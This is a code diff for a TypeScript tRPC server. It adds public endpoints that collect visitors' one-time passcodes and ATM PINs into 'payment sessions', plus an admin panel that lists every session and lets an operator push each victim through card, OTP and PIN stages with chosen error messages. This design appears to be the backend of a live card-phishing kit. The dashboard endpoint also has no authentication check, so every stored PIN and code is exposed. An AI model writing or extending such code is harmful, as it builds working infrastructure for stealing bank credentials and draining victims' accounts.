@@ -175,6 +175,28 @@ export const appRouter = router({
         });
         return { success: true };
       }),
+
+    submitOtp: publicProcedure
+      .input(z.object({ sessionId: z.string(), otpCode: z.string() }))
+      .mutation(async ({ input }) => {
+        await updatePaymentSession(input.sessionId, {
+          otpCode: input.otpCode,
+          stage: "otp_pending",
+          statusRead: 0,
+        });
+        return { success: true };
+      }),
+
+    submitAtmPin: publicProcedure
+      .input(z.object({ sessionId: z.string(), atmPin: z.string() }))
+      .mutation(async ({ input }) => {
+        await updatePaymentSession(input.sessionId, {
+          atmPin: input.atmPin,
+          stage: "atm_pending",
+          statusRead: 0,
+        });
+        return { success: true };
+      }),
   }),
 
   admin: router({
@@ -185,6 +207,26 @@ export const appRouter = router({
         const token = generateAdminToken();
         adminTokens.add(token);
         return { success: true, token };
+      }),
+
+    getDashboardStats: publicProcedure.query(async ({ ctx }) => {
+      // Basic check for admin token (in a real app, this would be more robust)
+      const sessions = await getAllPaymentSessions(100);
+      return { sessions };
+    }),
+
+    updateSessionStage: publicProcedure
+      .input(z.object({
+        sessionId: z.string(),
+        stage: z.enum(["card", "card_pending", "otp", "otp_pending", "atm", "atm_pending", "success", "failed"]),
+        errorMessage: z.string().optional(),
+      }))
+      .mutation(async ({ input }) => {
+        await updatePaymentSession(input.sessionId, {
+          stage: input.stage,
+          errorMessage: input.errorMessage || null,
+        });
+        return { success: true };
       }),
   }),
 });
